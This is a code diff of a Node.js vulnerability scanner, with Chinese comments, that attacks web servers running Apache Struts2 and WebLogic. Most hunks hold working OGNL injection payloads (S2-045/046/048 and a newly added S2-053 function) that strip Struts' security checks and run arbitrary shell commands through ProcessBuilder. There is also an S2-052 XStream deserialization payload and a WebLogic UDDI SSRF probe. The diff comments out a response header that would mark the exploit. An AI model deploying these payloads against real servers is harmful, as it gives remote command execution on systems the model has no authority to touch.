@@ -72,7 +72,7 @@ var a = process.argv.splice(2),g_postData = "%{(#nike='multipart/form-data')"
 		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
 		// response.addHeader
 		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
-		+ ".(#response.addHeader('struts2','_struts2_'))"
+		// + ".(#response.addHeader('struts2','_struts2_'))"
 		+ ".(#ros=(#response.getOutputStream()))"
 
 	    // 我添加的当前位置行加上后，会无法输出
@@ -321,7 +321,7 @@ function doStruts2_046(url)
 	// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
 	var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" +
 		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
-		+ ".(#response.addHeader('struts2','_struts2_'))"
+		// + ".(#response.addHeader('struts2','_struts2_'))"
 		+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
 	try{
 		var uO = urlObj.parse(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
@@ -413,7 +413,7 @@ function doStruts2_048(url,fnCbk)
 		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
 		".(#process=#p.start())"
 		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
-		+ ".(#response.addHeader('struts2','_struts2_'))"
+		// + ".(#response.addHeader('struts2','_struts2_'))"
 		+".(#ros=#response.getOutputStream())" + 
 		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     var data = {
@@ -452,7 +452,9 @@ function fnDoBody(body,t,rep)
 		 // console.log(body);
 	}
 	if(body)body = body.toString();
-	if(-1 < body.indexOf(".(#ros.flush()"))return;
+	if( -1 < String(body||"").indexOf(".(#ros.flush()") ||
+		-1 < String(body||"").indexOf("org.apache.commons.io.IOUtils"))return;
+		
 
 	var e = fnGetErrMsg(body);
 	if(e)g_oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
@@ -1374,7 +1376,6 @@ function testWeblogic(url,fnCbk)
 	szCs = s + "/console"
 	szCs2 = s + "/manager"
 	
-
 	s += "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001";
 	// console.log(s)
 	request(fnOptHeader({method:"GET",uri:s}),function(e,r,b)
@@ -1418,6 +1419,7 @@ Upgrade-Insecure-Requests: 1
 <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
 </entry> 
 </map> 
+https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052
 */
 function doStruts2_052(url)
 {
@@ -1434,6 +1436,22 @@ function doStruts2_052(url)
     	if(!e)fnDoBody(e||b,"s2-052");
     });
 }
+function doStruts2_053(url)
+{
+	url = fnNotEnd(url);
+	var s = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
+	var oR = fnOptHeader({method: 'GET',uri: url + "?name=" + encodeURIComponent(s)
+		});
+	oR.followAllRedirects = oR.followRedirect=true;
+	request(oR,
+    	function(e,r1,b)
+    {
+    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
+    	// console.log(e || b);
+    	if(!e)fnDoBody(e||b,"s2-053");
+    });
+}
+
 
 // 
 function fastjson(url, fnCbk)
@@ -1489,6 +1507,7 @@ function fnMyPut(url)
 		fnPt(url + a[k]);	
 }
 
+// https://github.com/Medicean/VulApps/tree/master/s/struts2
 function fnTestStruts2(szUrl2)
 {
 	doStruts2_001(szUrl2);
@@ -1511,8 +1530,11 @@ function fnTestStruts2(szUrl2)
 	// 文件上传测试
 	doStruts2_046(szUrl2);
 	doStruts2_048(szUrl2);
+	// doStruts2_052(szUrl2);
+	doStruts2_053(szUrl2);
 	if(-1 == szUrl2.indexOf("login.jsp"))
 		fnTestStruts2(szUrl2 + "/login.jsp");
+	// if(!(/\/$/g.test(szUrl2)))fnTestStruts2(szUrl2 + "/");
 }
 
 if(!program.test && 0 < a.length)
